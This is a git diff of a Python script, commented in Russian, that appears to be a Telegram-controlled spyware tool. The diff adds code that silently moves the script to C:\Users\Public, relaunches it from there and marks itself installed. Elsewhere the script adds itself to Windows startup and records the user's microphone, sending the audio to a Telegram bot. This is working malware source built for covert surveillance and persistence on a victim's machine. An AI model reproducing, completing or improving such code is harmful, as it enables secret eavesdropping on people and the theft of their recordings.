@@ -50,21 +50,50 @@ from multiprocessing import Process
 
 
 
-# Перемешени файла при запуске в папку C:\\Users\\Public
+
 try:
-    script_path = os.path.abspath(__file__)
-    config_path = os.path.join(os.path.dirname(script_path), 'main.py')
+    # Определение пути к исполняемому файлу
+    if getattr(sys, 'frozen', False):
+        script_path = sys.executable
+    else:
+        script_path = os.path.abspath(__file__)
 
+    print(f"Script path: {script_path}")
 
+    config_path = os.path.join(os.path.dirname(script_path), 'oved_config.txt')
+
+    print(f"Config path: {config_path}")
+
+    # Проверка конфигурационного файла
     if not os.path.exists(config_path) or not open(config_path, 'r', encoding='utf-8').read().strip() == 'oved=true':
-            script_path = os.path.abspath(__file__)
-            # Куда он будет сохраняться 
-            target_path = os.path.join('C:\\Users\\Public', os.path.basename(script_path))
-            shutil.move(script_path, target_path)
-            
-            os. remove('main.py')
-except:
-    print('None')
+        # Определение пути назначения
+        target_path = os.path.join('C:\\Users\\Public', os.path.basename(script_path))
+
+        print(f"Target path: {target_path}")
+
+        # Перемещение файла
+        shutil.move(script_path, target_path)
+        print(f"Script moved to {target_path}")
+
+        # Запись в конфигурационный файл
+        with open(config_path, 'w', encoding='utf-8') as config_file:
+            config_file.write('oved=true')
+
+        print(f"Configuration updated at {config_path}")
+
+        # Перезапуск скрипта из нового расположения
+        subprocess.Popen([target_path])
+        print(f"Script restarted from {target_path}")
+
+        # Завершение текущего процесса
+        sys.exit()
+    else:
+        print('Script already moved.')
+        # Выполнение основной логики скрипта после перемещения
+
+except Exception as e:
+    print(f'Error: {e}')
+
 
 
 def send_audio(bot, chat_id):
@@ -74,25 +103,12 @@ def send_audio(bot, chat_id):
         os.remove(r"C:\Users\Public\recorded.wav")
 
 
-# # Получаем путь к исполняемому файлу текущего скрипта
-# script_path = os.path.abspath(__file__)
-# # Создаем ключ реестра для автозагрузки
-# autostart_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
-# # Добавляем текущий скрипт в автозагрузку
-# winreg.SetValueEx(autostart_key, "main.exe", 0, winreg.REG_SZ, script_path)
-# # Закрываем ключ реестра
-# winreg.CloseKey(autostart_key)
-# # Получаем путь к директории автозагрузки
-# startup_dir = os.path.join(os.environ["APPDATA"], "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
-# # Копируем текущий скрипт в директорию автозагрузки
-# shutil.copy(script_path, startup_dir)
-
 ##########################################################
 auto = ''
 
 # API
 ##########################################################
-bot = telebot.TeleBot('YOUR_API_TELEGRAM_TOKEN')
+bot = telebot.TeleBot('YOUR_TOKEN_API')
 ##########################################################
 
 username = os.getlogin()
@@ -115,18 +131,6 @@ def add_to_startup(file_path=""):
 add_to_startup()
 
 
-# def check_running():
-#     for proc in psutil.process_iter():
-#         try:
-#             if 'python' in proc.name() and 'bot.py' in proc.cmdline():
-#                 return True
-#         except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
-#             pass
-#     return False
-#
-# if check_running():
-#     print('Бот уже запущен')
-#     exit()
 
 # Функция записи звука с микрофона
 def micro_phone(i):
